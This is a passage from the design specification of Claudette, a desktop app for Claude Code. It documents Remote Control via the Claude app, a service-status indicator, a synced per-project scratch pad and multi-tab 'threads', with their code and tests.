- **Placeholders**, filled from the selected tab and URL-escaped: `{branch}` (the git branch), `{changelist}` (the Perforce changelist Claude is working in, [§18](#perforce-changelist-in-the-tab-title)) and `{folderName}`. A link whose placeholder can't be filled right now is disabled and says why ("No git branch.").
- **Updates.** Links follow the selected tab, and are read again as its files are.
- **Editing.** Settings has a **Links** page for the selected tab ([§14](#the-projects-pages)): add, edit, remove and reorder the links of either file, with the address checked by the rules above. Saving reads the file as JSON, replaces only `links`, keeps every other key (the actions among them) and each entry's other fields, and never rewrites a file that isn't valid JSON, as the actions editor does. A link saved without a name has none in the file, and the menu shows its address. **Add a link…** in the project's menu opens that page with a new link started.

**Notifications.** When a job finishes or fails and Claudette isn't in front, a notification says so: *"Build editor failed (exit code 6)."* A stopped job doesn't notify. Clicking it selects the tab and shows that run's log in the main area. Settings → Notifications → **A project action finishes**, on by default ([§10](#10-notifications)).

**Settings → Project tools** ([§14](#pages)) is a group of pages in the sidebar, kept on each machine like the diff tool, each section with its **Reset to defaults**:

- **All tools**, what every kind of project shares:
  - **Solutions**: open them with the app the OS uses for them, Rider, Visual Studio, VS Code, or another program (with **Browse…**).
  - **Editor logs**: show editor logs under the tab, on by default (**Editor logs**, above).
- **A page for each project type** ([Project types](#project-types)), with its icon and its line: **Projects**, its two switches, **Recognize … projects** and **Tell Claude about … projects** (both on by default), then **Defaults**, what every project of the type starts with:
  - **Unreal Engine**: the default editor configuration, Development (the default) or DebugGame, where a project's own choice in the project's menu wins; and project files for Visual Studio, VS Code or Xcode, by default Visual Studio on Windows, Xcode on macOS and VS Code on Linux.
  - **Unity**: the default code optimization, Release (the default) or Debug; a project's own choice wins.
  - **Godot**: the executable's path, empty to find it, with **Browse…** and **Detect**.
- A type switched off says *Off* after its name in the sidebar. Its page can still be picked, with the rest of it disabled.
- **Perforce** ([Perforce ticket handling](#perforce-ticket-handling)) is a group of its own, **Source control**, after Git ([§14](#pages)).

**Testing.** No test runs a real engine: engines are a few files in temporary folders, the registry and running processes are fakes, and every process is a fake launcher's. `ProjectDiscoveryTests`, `ProjectTypeTests`, `UnrealEngineTests`, `UnrealCommandTests`, `CommandLineTests`, `UnrealProviderTests`, `UnityProviderTests`, `GodotProviderTests`, `ProjectJobTests`, `ProjectFileTests`, `RunLogLinksTests`, `LogTailTests` and `EditorLogTests` in Core; `SystemProcessesTests` in Platform; `ProjectToolsTests`, `ProjectRunsTests` and `EditorLogsTests` for the tab, and `ProjectMenuTests` for the project's menu built without one; `ProjectSettingsTests` for Settings' project pages and the Project tools group; and `ProjectToolsUiTests` and `ProjectSettingsUiTests` for the rendered project row and its menu with the links, the runs and an editor's log in the sidebar, a run's log and an editor's in the main area, and the project group, the Links page, the project types' icons and *Off* in Settings.

> **Still to verify on a machine with Unreal installed:**
> - Launching the editor and building from a launcher install and a source build on Windows, macOS and Linux, including DebugGame and `-debug`.
> - `Build.bat -projectfiles` in an installed build, and the format each OS gets without a switch.
> - The registry entries and `Install.ini` as UnrealVersionSelector writes them.
> - That Stop ends UnrealBuildTool and its compilers, and the process monitor lists them.
> - Opening a `.xcworkspace` and each IDE for real.
> - The editor-open warning, and End all Unreal editors, with real editors on each OS (on macOS, reading their command lines through `ps`).

### Remote Control (the Claude app)

✅ Built 2026-09-29.

A tab can be used from the Claude app on a phone, or at claude.ai/code, while Claudette keeps running it on this computer: at home on the desk, say, with the phone on the couch. Claude Code's [Remote Control](https://code.claude.com/docs/en/remote-control) does the work. The tab's `claude` connects out to claude.ai over HTTPS (no inbound ports), and the app shows the conversation, sends messages and answers prompts, while every tool keeps running here. The phone can get a push when a tab needs an answer.

- **Why per tab.** Claude Code gives each `claude` process one remote session, and Claudette runs one process per tab, so each tab is its own session in the app. While a tab is connected, its transcript is stored on Anthropic's servers, so connecting is a choice each tab makes; it's off unless the user turns it on.
- **The switch.**
  - **Connect to the Claude app** in the tab's menu (a check item) and in **Tab settings…** ([§4](#4-tabs--sessions)). It's `TabState.RemoteControl`, saved with the tab and in restart snapshots, so a connected tab reconnects by itself whenever its session starts: restored, resumed, or restarted after a sign-in or into a new build. It's the tab's own state like **Sync to other machines**, not an override, so **Use defaults** leaves it.
  - Turning it on connects straight away, or when the running turn ends; a tab that isn't running connects when it starts. Turning it off disconnects the same way.
  - Turned off while Claude works, the tab says so with a note, *"Disconnecting from the Claude app when Claude finishes this turn."*, and its row's phone icon fades further until Claude Code has closed the connection. Turned back on before the turn ends, it stays connected with the note *"Staying connected to the Claude app."* Turned back on once Claude Code is already closing the connection, it connects again when that's done.
- **Settings → Claude Code → Claude app**, kept on this machine and not synced, like the rest of the page:
  - **Connect new tabs to the Claude app** (off by default) sets the switch for tabs opened afterwards (the picker, History, `--folder`), like **Sync new tabs**. Turning it on or off never changes open tabs.
  - What it does, the privacy note, and that it needs a claude.ai subscription sign-in.
  - How to get pushes: turn on **Push when actions required** (`inputNeededNotifEnabled`), and if you like **Push when Claude decides** (`agentPushNotifEnabled`), in Claude Code's `/config`, with a link to the docs' [mobile push notifications](https://code.claude.com/docs/en/remote-control#mobile-push-notifications). Claudette doesn't edit `~/.claude/settings.json` for them.
  - **Also while tabs are connected to the Claude app**, in Settings → General → **Keeping the computer awake** (on by default; see "Keeping the computer awake" below).
- **An account that can't use it.** From `claude auth status` and the environment Claudette gives `claude`: signed in with an API key or an API key helper, through a cloud provider (`authMethod` `third_party`, or an `apiProvider` other than `firstParty`), or with `ANTHROPIC_BASE_URL` pointing somewhere other than `api.anthropic.com`. The setting and every tab's switch are disabled then, with the reason, and a tab whose switch is on says why and doesn't ask; it can still be turned off. A tab under one of Claudette's API-key accounts ([§4](#accounts)) is disabled the same way, whatever the Default account can do. Claude Code checks everything else itself when a tab connects (the plan, an organization's policy, feature flags), and the tab shows its reason.

**How a tab connects.** Confirmed against Claude Code 2.1.284 with the mock Messages API; a real connection hasn't been made yet (below).

- **The request.** As SDK hosts such as the VS Code extension do, Claudette sends the `remote_control` control request right after `initialize`, before any prompt goes out: `{"subtype":"remote_control","enabled":true,"name":"<the tab's name>"}`. The name becomes the session's title in the app.
  - Claude Code runs its eligibility checks, registers the session with claude.ai and answers with `session_url`, `connect_url`, `environment_id`, `bridge_session_id` and `bridge_epoch`. Claudette uses `session_url` (else `connect_url`) and ignores the rest.
  - When it can't connect, the answer is an error with Claude Code's reason. Against the mock that's *"Remote Control is only available when using Claude via api.anthropic.com. ANTHROPIC_BASE_URL is set…"*.
  - `{"subtype":"remote_control","enabled":false}` disconnects, and the session carries on here. If that fails, Claudette restarts the tab's `claude` on the same session (the conversation carries on) with the switch off, so it doesn't connect again.
- **Why not `/remote-control`.** The docs have VS Code users type `/remote-control`, but the extension sends the request above. Sent as a message in `-p` mode, 2.1.284 answers the command locally with *"/remote-control isn't available in this environment."*, whatever the account: the reply's `local_command_outcome.kind` is `unavailable_headless`, "an interactive-panel command this session cannot open". The `--remote-control` flag is accepted and does nothing visible in `-p` mode.
- **Undocumented, so there's a fallback.** A Claude Code that rejects the request as unsupported (*"Unsupported control request subtype: remote_control"*) gets `/remote-control <the tab's name>` instead, as a message of its own, sent only while Claude isn't working so the next turn to end is its answer. It isn't shown as something the user sent, and its reply is shown as a note rather than a reply, read tolerantly: a claude.ai/code address means connected; *isn't available*, *requires*, *disabled* and the like mean not available, with the reply as the reason; anything else counts as connected, with the reply as the note. With 2.1.284 the fallback only says why the tab isn't connected.
- **What Claude Code reports afterwards.**
  - `system/bridge_state` (undocumented), with `state` and `detail`: `ready` and `connected` bring a dropped connection back; `reconnecting` keeps the tab connected, with its icon dimmed; `failed` disconnects it, with the reason; `policy_disabled` makes it not available. A state Claudette doesn't know changes nothing.
  - `system/worker_shutting_down` (documented): a connected tab is disconnected, with its reason (`host_exit`…). One that arrives while the tab isn't connected is ignored, since a resumed session can replay old ones.
  - Turned off by a policy: `bridge_state` `policy_disabled`, or since 2.1.286 `worker_shutting_down` with the reason `remote_control_disabled` while the tab wasn't disconnecting itself. The tab says Remote Control isn't available, and so does every other tab: none tries to connect again, as each would whenever it starts, until Claudette restarts or another account signs in. The tab's switch stays as the user left it.
  - The process exiting disconnects the tab.

**States.** Not connected, Connecting, Connected (with the session's address, when Claude Code gave it) and Not available (with Claude Code's reason). What the tab shows:

- A note in the conversation: *"Connected to the Claude app."* with the session's address as a link, or *"Couldn't connect to the Claude app: <reason>"*, *"Disconnected from the Claude app."* and so on.
- A phone icon on the tab's row while it's connected, dimmed while it connects or reconnects, with the tip *"Connected to the Claude app"* ([§4](#sidebar)). Once the switch is off it's fainter still until the tab has disconnected, with the tip *"Connected to the Claude app. Disconnects when Claude finishes this turn."* while it waits for the turn, then *"Disconnecting from the Claude app…"* (from its handler, Claude Code 2.1.284 archives the session on claude.ai before it answers, which can take a moment).
- A **Claude app** row on the tab info card: *"Connected: <address>"*, *"Connecting…"*, *"Connects when Claude finishes this turn"*, *"Connects when the tab starts"*, or why it isn't connected. A tab that's switched off but still connected adds *"Disconnects when Claude finishes this turn."* or *"Disconnecting…"*.
- **Open in the Claude app** in the tab's menu while it's connected with an address. It opens the session at claude.ai/code in the browser; on a phone, the same link opens the app.
- **Renaming.** A rename still goes to Claude Code as `rename_session` when **Name each tab's session in Claude Code after the tab** is on ([§13](#integration-with-claude-code)). The docs say the remote title follows `/rename`, but also that a name given when connecting comes first, and the tab gives one; which wins hasn't been seen yet.

**Prompts answered on the phone.** When the app answers a permission prompt, question or plan, Claude Code 2.1.284 withdraws Claudette's copy with a `control_cancel_request` for its `can_use_tool` request (from its source: the app's answer is injected as if Claudette had answered). The card closes, and reads *"Answered in the Claude app"* while the tab is connected and Claudette didn't stop the turn or a subagent itself; otherwise *"No longer needed"*, as before. It isn't an error: the tab's *Needs input* status and notification go. Permission prompts and questions have no deadline; `dialogExpiry` only governs other dialogs Claude Code forwards.

**Pushes and the presence file.** Claude Code pushes to the phone when the user turned that on in `/config` (above). It skips pushes while the file named by `CLAUDE_CLIENT_PRESENCE_FILE` exists, so every `claude` Claudette starts (tabs, the utility session, `auth`, `--version`, `update`) gets it, naming `presence` in the data folder (`AppPaths.PresenceFile`). Claudette creates the file while its main window is active and deletes it when the window isn't, at exit, and at launch (one left by a Claudette that didn't close cleanly). So the phone buzzes only when you're away from Claudette. Claudette's own OS notifications ([§10](#10-notifications)) are unchanged.

**Keeping the computer awake.** A sleeping computer can't be reached from the phone, so while at least one tab is connected and **Also while tabs are connected to the Claude app** (Settings → General) is on, Claudette holds off system sleep. The screen can still turn off. It lets go when no tab is connected, when the setting is turned off, and at exit, unless Settings → General's **Keep this computer awake** holds it ([§9](#keeping-the-computer-awake)); the header's cup steams while either does. `ISleepBlocker` in Core, held by `Services/KeepAwakeService` for both; the implementations are in `Claudette.Platform/Power`:

- **Windows:** `SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED)` on a thread of its own that lives until Claudette closes, since the state belongs to the thread that set it; `ES_CONTINUOUS` alone clears it.
- **macOS:** `caffeinate -i -w <Claudette's pid>` through `IProcessLauncher`, ended to let go. `-w` ends it with Claudette, even one that crashed.
- **Linux:** `systemd-inhibit --what=sleep --who=Claudette --why="Claudette is keeping this computer awake" --mode=block /bin/sh -c 'while kill -0 "$1"; do sleep 10; done' claudette-awake <pid>`, ended to let go. The command waits while Claudette's process is there, as `caffeinate -w` does on macOS, so a Claudette that crashed or was killed lets the computer sleep again within 10 seconds (POSIX `sh` rather than GNU `tail --pid`, which not every distribution has). Without `systemd-inhibit`, nothing is kept awake. A helper that stops by itself (logind refusing, say) no longer blocks anything.
- Diagnostics (Settings → Advanced) says how many tabs are connected and whether the computer is being kept awake, or why not.

**Requirements.** From the docs: a claude.ai subscription (Pro, Max, Team or Enterprise; on Team and Enterprise an Owner turns Remote Control on), signed in through claude.ai with a full-scope login. Not an API key, `ANTHROPIC_AUTH_TOKEN`, a long-lived token from `claude setup-token`, Bedrock, Google Cloud or Foundry, a custom `ANTHROPIC_BASE_URL`, or `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC`. Claudette checks what it can know beforehand, and Claude Code's own answer covers the rest.

**Privacy.** While a tab is connected, its transcript (messages, replies and tool activity) is stored on Anthropic's servers, under the same data usage policy. Execution and files stay on this computer. That's why the switch is per tab and off by default, and the setting says so.

**Code.** `Claudette.Core/RemoteControl` (the request and its replies, eligibility, the presence file, `ISleepBlocker`), `ClaudeSession.EnableRemoteControlAsync` and `DisableRemoteControlAsync`, `Services/RemoteControlService.cs` (eligibility, the presence file and the connected tabs, shared by the tabs, which `Services/KeepAwakeService.cs` keeps the computer awake for), and `ViewModels/RemoteControlViewModel.cs` (each tab's `RemoteControl`).

**Tests.** `RemoteControlProtocolTests` in Core (the wire format, replies, states and eligibility); `SleepBlockerTests` in Platform (fakes, the process mechanics with a harmless `sleep`, and the Windows call and `caffeinate` on their own OS); `RemoteControlTests` for the tab with the scripted transport (the switch, connecting before any prompt, the fallback, `bridge_state`, `worker_shutting_down`, the restart, restoring, eligibility, prompts answered in the app, the presence file and keeping awake); `RemoteControlUiTests` for the rendered menu, row icon, Tab settings and Settings block; and the RealCli tests: the real `claude` answering `remote_control` with its eligibility check and `/remote-control` with *"isn't available"* (`RealCliTests`), and a tab whose switch is turned on ending *Not available* with the reason (`RemoteControlRealCliTests`). No test connects for real.

> **Not yet tried for real** (needs a claude.ai subscription, a phone and the Claude app): a real connection and what its answer and `bridge_state` messages hold; the session's title in the app, and whether it follows renames; prompts answered on the phone closing their cards here; pushes arriving, and the presence file holding them off; disconnecting with `enabled: false`; a restarted or restored tab reconnecting to a new session in the app; and keeping real Windows, macOS and Linux machines awake. A later version could pass `bridge_session_id` back as `reattach_session_id` so a restarted tab keeps its session in the app.

### Service status

✅ Built 2026-09-29.

When Claude itself has trouble, tabs fail in ways that look like Claudette's fault or the user's: retries, overloaded errors, a sign-in that won't finish. Claudette reads Claude's public status page and says so: a dot in the header, and a banner across the top while an incident concerns what Claudette uses.

- **The source.** `https://status.claude.com/api/v2/summary.json`, the page's Atlassian Statuspage v2 summary (status.claude.ai redirects there). A plain `GET` with Claudette's User-Agent (`Claudette/<version>`) through `AppServices.Http`, the client the update check uses ([§2](#updating-claudette)). No sign-in, and nothing else is sent. The fields it reads, tolerantly (unknown fields are ignored, and unknown values read as unknown):
  - `status.indicator`: `none`, `minor`, `major` or `critical` (or `maintenance`).
  - `components[]`: `id`, `name` and `status`: `operational`, `degraded_performance`, `partial_outage`, `major_outage` or `under_maintenance`.
  - `incidents[]`, the unresolved ones: `id`, `name`, `status` (`investigating`, `identified`, `monitoring`, `resolved`, `postmortem`), `impact`, `shortlink`, `updated_at`, and `components` when it names them.
  - `scheduled_maintenances[]`: `id`, `name`, `status` (`scheduled`, `in_progress`, `verifying`, `completed`), `shortlink`, `scheduled_for`, `scheduled_until` and `components`.
  - A failed request, an error status, or an answer that isn't a JSON object is *Status unknown*, never an error dialog.
- **What's watched.** What Claudette relies on: **Claude Code**, the **Claude API** (Claude Code's model calls) and **claude.ai** (sign-in, and [Remote Control](#remote-control-the-claude-app)). Components are matched by name, tolerantly, ignoring case and surrounding spaces: "Claude Code"; a name containing "Claude API" or "api.anthropic.com" (today "Claude API (api.anthropic.com)"); and "claude.ai". Others, such as the Console, Cowork and Claude for Government, don't count.
- **One level**, for the dot:
  - The worst of the watched services: *operational*; *degraded* (`degraded_performance`); *outage* (`partial_outage` or `major_outage`: a partial outage is an outage for whoever it hits); *maintenance* (`under_maintenance`).
  - An open incident that concerns a watched service makes it at least degraded, and maintenance in progress at least maintenance.
  - When none of the watched services is listed (renamed, say), the page's own indicator decides: `none` is operational, `minor` degraded, `major` and `critical` an outage. Anything else is unknown.
- **Which incidents.** Unresolved ones that name a watched component (by name or id), or name no components at all, newest update first. Maintenance counts while it's under way (`in_progress`, `verifying`) on a watched service or names none; scheduled maintenance isn't shown until it starts.
- **When it checks.**
  - At launch, before Claude Code is found or signed in (an incident can be why those fail), then every 5 minutes, on `TimeProvider` timers.
  - Straight away when a tab's request fails on Anthropic's side, at most once a minute: `system/api_retry` with a 5xx `error_status` (529 is an overload) or an `overloaded` or `server_error` category, the same in a subagent's `subagent_retry`, or a turn that ended with a 5xx `api_error_status`. Within a minute of the last check, the next one is brought forward to a minute after it. A rate limit (429), a sign-in problem or a bad request is the user's own, and doesn't count.
  - A failed check backs off: 5 minutes, then 10, 20, and 30 from then on. Meanwhile the dot says *Status unknown*. The first good answer goes back to every 5 minutes.
- **The dot**, at the header's right, before the account name: green when operational, amber when degraded or under maintenance, red for an outage, and grey when unknown or not checked yet.
  - Its tooltip: the level, each watched service and its status, the latest incident's name and status, any maintenance under way, and "as of HH:mm" (the check's time); after a failed check, why it failed.
  - Clicking it opens status.claude.com. Its accessible name says the level.
- **The banner**, across the top under the header, while a watched service isn't operational or an open incident concerns one:
  - *"Claude is having problems: Elevated errors on claude.ai, Claude Code, Claude Cowork and the Claude API (investigating)"*: the latest incident and where it's at, with "and 1 more incident" when there are others. Without an incident, the services that aren't well: *"claude.ai (partial outage)"*.
  - It uses the caution colors, like the usage alert. Maintenance alone gets a quieter banner in the subtle surface colors: *"Claude maintenance in progress: <its name>"*.
  - **Status page** opens the incident's (or maintenance's) short link, else status.claude.com.
  - **Dismiss** hides it until a different incident or maintenance arrives, or the level gets worse. What was dismissed (the ids and the level) is kept with this machine's state (`AppState.DismissedServiceStatus`) and forgotten once everything is operational with nothing open.
  - It goes by itself when everything is operational again; the dot stays, green. A failed check hides it too, since the status is then unknown.
- **The setting.** Settings → General → **Show Claude's service status**, on by default. It's kept on this machine (General doesn't sync). Off hides the dot and banner and stops the checks; on checks straight away.
- **Both styles.** Only existing tokens: `OkTextBrush`, `MeterWarningBrush`, `MeterCriticalBrush` and `MutedTextBrush` for the dot; `CautionBackgroundBrush` and `CautionBorderBrush` for the banner (warm tints of the accent in the Claude style); `SubtleBrush` and `DividerBrush` for the maintenance banner.
- **Not Claude Code's surface.** The status page isn't part of Claude Code, so it isn't in `compat/surface.yaml`; its address and fields are recorded here. The Claude Code fields the tabs read for it (`error_status`, `error_category` and `api_error_status`) are.

**Code.** `Claudette.Core/Status`: `StatusSummary` (the parser), `StatusFeed` (the request), `ServiceStatusReport` (the watched services, the level, the incidents, and `ServiceStatusDismissal`) and `ApiTrouble` (which session events are worth a check). In the app, `Services/ServiceStatusService.cs` (the schedule, the backoff and dismissing), started by `MainWindowViewModel` at launch and told about API errors by `TabViewModel`, and `ViewModels/ServiceStatusViewModel.cs` (the dot and the banner).

**Tests.** `ServiceStatusTests` in Core: the real summary from an incident on 2026-09-29 (trimmed, in `Fixtures/status/`), all operational, maintenance, unknown values and malformed answers, levels and name matching, which incidents count, dismissals, which API errors count, and the request against `FakeHttpHandler`. `ServiceStatusTests` in the App tests, with `FakeTimeProvider`: the check at launch, every 5 minutes, the backoff up to 30, checks on API errors at most once a minute (and from a tab's `api_retry`), the banner shown, dismissed, back for a new incident or a worse level, gone on recovery, maintenance, and the setting. `ServiceStatusUiTests`: the dot's place and tooltip, the banner rendered, **Dismiss**, and the colors in both styles, light and dark. Nothing reaches the network.

### Scratch pad

✅ Built 2026-10-01.

A place to keep notes beside the conversation: what to check later, a command worth keeping, a piece of a reply. One pad per project, shared by every tab in it, and by the same project on the user's other machines.

- **The page.** **Scratch pad**, the first tool window splitting the right side until the user moves it, always there ([§3](#3-main-window)), and **Show scratch pad** in the command palette.
  - Its first line names the project, as its tab group is labeled: *"Shared by the tabs in api"*, with **Copy all** and **Clear…** (which asks first, in place: it empties the pad for every tab of the project, and on the other machines).
  - Under it, where the pad is kept: *"Synced to your other machines through the session library."*; with the library in its default folder, which no other machine sees, *"On this machine. To see it on your other machines too, keep the session library in a synced folder (Settings → Sessions)."*; or why it stays here: *"On this machine only: the repository has no remote to know it by on another machine."*, *"… the folder isn't in a git repository."*
  - The rest is the text: plain text in the code font, so pasted code keeps its columns, wrapping at the width shown. Typing saves it a second after typing stops.
- **Adding to it.** Each puts the text at the end after a blank line (blank lines around it and trailing spaces left out), shows the Scratch pad tool window, and selects what was added there, without taking the keyboard from where it was. A screen reader hears *"Added to the scratch pad."*
  - **Right-click on selected text** in the conversation (a prompt, a reply across its Markdown, thinking, a tool's input or output, a note, anything in a subagent's group): **Copy** and **Add to scratch pad**. With nothing selected, right-clicking a prompt or reply gives **Copy message** and **Add message to scratch pad**, and a finished reply **Show as the plan** ([§5](#tasks)). Anywhere else a control keeps its own menu.
  - **A message's chip** ([§5](#copy-and-times)), beside **Copy message**: the whole message, as Copy copies it (a reply's Markdown, a prompt with its suffixes).
  - **A code block's header**, beside **Copy**: the code, fenced in its language (```` ```csharp ````), with a longer fence when the code has one of its own. In a tab's conversation and the Scratch pad window, not the agent map's window, which has no pad.
- **Which pad.** A project is known as a session's project identity is ([§9](#session-library-sync-across-machines)): the git remote in its normal form, and the folder's path inside the repository. So every branch, worktree and clone of it shares the pad, and a tab group for a subfolder (`api/web`) has its own, as tab groups are by folder. Without a remote it stays on this machine: a repository's pad by its git folder and the path inside it (its worktrees still share it), any other folder's by its path. The pad's file is named by a hash of that, so the library's file names don't name remotes or folders.
- **Where it's kept.**
  - This machine's copy: `scratch/<id>.json` in the data folder. The pad saves there first, so nothing typed waits on the library.
  - The shared copy of a pad with a remote: `scratch/<id>.json` in the session library ([§9](#session-library-sync-across-machines)), whichever folder the library is in. It holds the text, the remote and path (so a person can tell the files apart), the machine and time of the change, and the revisions it carries on from. Written whole through a temporary name, like the library's other files.
- **Syncing.** After each save, when the page shows, when Claudette comes to the front (at most every 10 seconds) and once a minute, for the pads open tabs use. Each save is a new revision, and the shared copy remembers the revisions it built on (its last 64), so:
  - The library's copy carries on from what this machine last synced, and nothing changed here since: it's taken, and the page shows it. Not over anything typed meanwhile: that save's sync finds both changed.
  - This machine's carries on from the library's: it's written there.
  - The same text either way: nothing to do.
  - Otherwise both changed without seeing each other: one machine was offline, or a sync client kept the other's file over this one's. Nothing is lost. A banner over the pad, in the caution colors, says *"DESKTOP-01 also changed this scratch pad (14:05). Which should it keep?"*, shows their text, and offers **Keep both** (the lines the two share once, with this machine's additions, then theirs), **Use theirs** and **Keep mine**. The choice is written as a revision that carries on from both, so the other machine takes it without asking. If the library's copy moved on again while the user chose, it asks about that instead.
  - A sync client's conflict copy of the file (`<id> (1).json`, `… (DESKTOP-01's conflicted copy …).json`, recognized as the library's session copies are) is asked about the same way, and deleted once chosen. One the library's copy already carries on from, or with the same text, is deleted without asking.
  - The library can't be reached (its drive isn't there), or its copy can't be read (a sync client mid-write): the pad stays saved here, the second line says so in the caution color with the reason as its tip, and the next sync tries again. A copy written by a newer Claudette is left alone, and the line says to update.
  - This machine's copy that isn't a pad's file is kept beside it as `<id>.<time>.bad`, as settings files are ([§14](#storage)), and the pad starts empty. One that can't be read just now isn't saved over: the pad is read-only and tried again at the next sync.
- **Closing.** A pad no open tab uses any more is saved and synced, then let go. Closing Claudette, and restarting into a new build ([§9](#working-on-claudette)), save every pad and sync them, waiting up to 3 seconds for the library. A pad is opened only when a tab first shows its page or adds to it, so launching with many tabs reads none.
- **Not part of.** Find, Export, the conversation and Claude: the pad is the user's own, and nothing in it is sent to Claude unless pasted into a message. Settings sync doesn't carry it, and library retention leaves `scratch` alone.

**Code.** `Claudette.Core/ScratchPads`: `ScratchPadProject` (which pad a folder has), `ScratchPadFile` (the file and its revisions), `ScratchPadSync` (the decisions above, pure), `ScratchPadStore` (the two folders, conflict copies) and `ScratchPadText` (adding, fences and **Keep both**). In the app, `Services/ScratchPadService` (one `ScratchPadViewModel` per project, shared by its tabs, and the minute's sync), `ViewModels/ScratchPadViewModel` (the text, saving, syncing and the banner), `TabViewModel.ScratchPad.cs` (the tab's pad and the add commands), `Views/ScratchPadView` (the page) and `Views/ScratchPadAdd` (the menu of selected text and the code block's button).

**Tests.** In Core: `ScratchPadProjectTests` (clones and worktrees share a pad, subfolders don't, no remote stays here), `ScratchPadTextTests`, `ScratchPadSyncTests` (every decision, resolving, the file read tolerantly) and `ScratchPadStoreTests` (two machines on one library folder: changes passing, both typing, a sync client keeping one machine's file, its conflict copies, an unreachable library). In the app, `ScratchPadTests` with `FakeTimeProvider`: tabs sharing a pad, saving once typing pauses, each way of adding, another machine's change arriving, each choice about both changing, closing and quitting. `ScratchPadUiTests`: the page rendered, the menu of selected text, and the code block's button in a tab but not the agent map's window.

### Threads

✅ Built 2026-10-09, from [issue #39](https://github.com/dotBunny/Claudette/issues/39).

One task spread over several tabs in a project used to mean copying prompts into each tab and their replies back. A tab can be made a **thread**: other tabs in its folder group become its **sub-threads**, and the thread's Claude hands them work and gets their results back, while each stays a whole tab the user can watch, steer and answer. Subagents don't do this: they run inside one session, and the user can't step into one as they can a tab.

- **Setting it up.** The tab menu's **Thread** submenu, in the sidebar and the rail, and the command palette:
  - **Make this tab a thread** and **Stop being a thread**. A sub-thread can't be a thread itself: threads don't nest.
  - **Assign to thread**, a submenu listing the group's threads, and **Detach from thread**. Only tabs in the thread's folder group, worktree tabs of its checkout included ([Worktree tabs](#worktree-tabs)).
  - **New sub-thread** and **New sub-thread in a worktree**, on a thread: a new tab in its folder, assigned to it.
  - **Go to thread**, on a sub-thread.
  - **Ask before sending to sub-threads**, on a thread: on by default.
- **In the sidebar.** A thread's row has a thread icon before its name, with *"A thread, with 2 sub-threads"* as its tip, and its sub-threads sit right under it, indented. Reordering keeps them there: **Move up** and **Move down** move a thread with its sub-threads past the next tab or thread, and a sub-thread among its thread's; one dragged away comes back. While any of them works, the thread's second line says so when nothing else needs saying: *"Thread · 2 of 3 working"*. The thread's chevron collapses them under it, with its own subagents and runs; going to one, adding one, or one starting to wait on you opens it again ([§4](#sidebar), "Collapsing a tab").
- **What the thread's Claude knows.** The next message the user sends in the thread carries a note naming its sub-threads and how they work (`ThreadMessages.Note`), after the thread is made and whenever its sub-threads change; one saying it's no longer a thread after **Stop being a thread**. The message's card shows *"Told Claude about its sub-threads"* under it, with the note as its tip. Nothing else is sent for it, so setting a thread up costs no turn.
- **Handing out work.** The thread's Claude calls Claude Code's own `SendMessage` with a sub-thread's name. Claudette's PreToolUse hook on `SendMessage`, which every tab registers at `initialize` ([§13](#integration-with-claude-code), "Hook callbacks"), sees the call before Claude Code looks the name up, and when the tab is a thread and the name one of its sub-threads':
  - With **Ask before sending** on, the thread waits on the user, as for a permission prompt: a card over its composer, *"Send this to Art page?"* with the message, **Send** and **Don't send**. The tab needs input meanwhile, with its notification. After 10 minutes unanswered it's not sent, and Claude is told so.
  - Claudette delivers the message into the sub-thread itself: at once when it's idle, or held until its turn ends when it's busy ([Queued messages](#queued-messages)), so a thread never turns a sub-thread from work the user started. The sub-thread's card is labeled *"From the thread ‹name›"*, and its Claude reads who it's from and that its final reply goes back on its own (`ThreadMessages.ForSubThread`). It carries no `origin`, as Claudette's other messages don't ([§13](#integration-with-claude-code), "Who a message is from").
  - The hook stops Claude Code's own delivery, and its answer, which Claude gets as the tool's result, says the message went and that results come back by themselves. Claude Code marks that result an error, but the thread's tool row shows it as done, not failed.
  - A call that only asks to be told when a sub-thread is idle (`notify_when_idle` without a message) is stopped too: the report below does that.
  - Anything else goes on as Claude Code would send it: a name that isn't a sub-thread's, any tab that isn't a thread, and the subagents' and teammates' own messages.
- **Results come back once.** A sub-thread is waited on from the moment Claudette delivers it a message until the turns those messages started have ended. When none of a thread's sub-threads is waited on any more, the thread gets one message with each one's outcome and last reply (`ThreadMessages.Report`), labeled *"From the sub-threads"*: finished, stopped by the user, ended with an error, or closed or detached before it finished. A reply is cut at 20,000 characters, the rest being in its tab. Into the thread's turn if it's working, as a check-in goes; otherwise as its next turn. So a thread that sends to three sub-threads takes one more turn, not three, and the sub-threads spend nothing writing reports.
- **Prompts stay the user's.** Claudette never answers a sub-thread's permission prompts, questions or plans, and the thread's Claude never hears of them. While a sub-thread waits on the user, the thread shows it in a strip over its composer: the sub-thread's name and what it asks (*"Allow this command? npm test"*), with **Allow** and **Deny** for a permission prompt and **Go to tab** for each. Answering there answers the sub-thread's own prompt, through its own session, and costs no tokens.
- **Kept with the tabs.** Whether a tab is a thread, its **Ask before sending**, whether it's collapsed and which thread a tab belongs to are saved with the tabs, through restarts and restarting into a new build. Work under way when Claudette closes isn't: a restored thread gets no report for it.
- **Closing and copies.** Closing a thread leaves its sub-threads open as ordinary tabs; so does **Stop being a thread**, and neither sends a report for work under way, which would start a turn for nothing. Closing a sub-thread the thread waits on puts *"closed before it finished"* in its report. **Duplicate tab**, **Branch from here** and opening a copy from History start ordinary tabs.
- **Not covered.** Nested threads; sub-threads from other folder groups; syncing threads through the session library; the thread making sub-threads or answering their prompts; the labels after a transcript is read back (the message's text still says who it's from).
- **Why not an MCP server.** The issue proposed an in-process MCP server with four tools. Claude Code's own `SendMessage` and a hook do the sending with no undocumented wire format and no tool definitions in every request, and pushing results back, rather than a tool that waits, keeps the thread from spending a turn per sub-thread. Checked against 2.1.284 with the mock API: the hook is called before the name is looked up, its refusal reaches Claude as the tool's result, and a hook registered with a longer timeout can wait on the user past Claude Code's 60-second default (75 seconds checked; the hook is registered for 11 minutes and answers at 10).
- **Claude Code's own cross-session messages** still reach tabs: a message another session sends a tab echoes with `origin: {kind: "peer", name, body}`, and the tab shows it labeled *"From the session ‹name›"*, or *"From another session"* when the sender has no name.

**Code.** `Claudette.Core/Threads`: `SendMessageCall` (the hook's view of a call), `ThreadNames` (sub-threads' names, unique within a thread) and `ThreadMessages` (everything Claude reads about threads). In the app, `TabViewModel.Thread.cs` (a thread's hook, approvals, reports and the waiting strip; a sub-thread's deliveries and its part of the report) and `ShellViewModel.Threads.cs` (the menus' commands, keeping sub-threads under their thread, restoring the links, closing).

